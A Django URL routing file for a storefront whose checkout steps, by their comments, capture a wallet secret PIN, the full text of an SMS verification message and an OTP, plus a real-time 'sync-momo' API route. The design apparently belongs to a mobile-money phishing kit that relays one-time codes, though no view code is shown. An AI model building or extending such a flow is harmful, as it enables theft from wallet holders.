from django.urls import path
from . import views

urlpatterns = [
    # 1. Front Storefront Catalog Route
    path('', views.index, name='index'),
    
    # 2. Step 1: Unified Core Account details and Wallet secret PIN capture
    path('checkout/', views.checkout, name='checkout'),
    
    # 3. Step 2: Full SMS Verification Text Entry Page
    path('checkout/sms/<int:order_id>/', views.verify_sms, name='verify_sms'),
    
    # 4. Step 3: Numerical Security Code Match verification
    path('checkout/otp/<int:order_id>/', views.verify_otp, name='verify_otp'),
    
    # 5. Token Reset Route
    path('checkout/resend-otp/<int:order_id>/', views.resend_otp, name='resend_otp'),
    
    # 6. Real-time Background Sync Gateway API Engine
    path('api/sync-momo/', views.sync_momo, name='sync_momo'),
]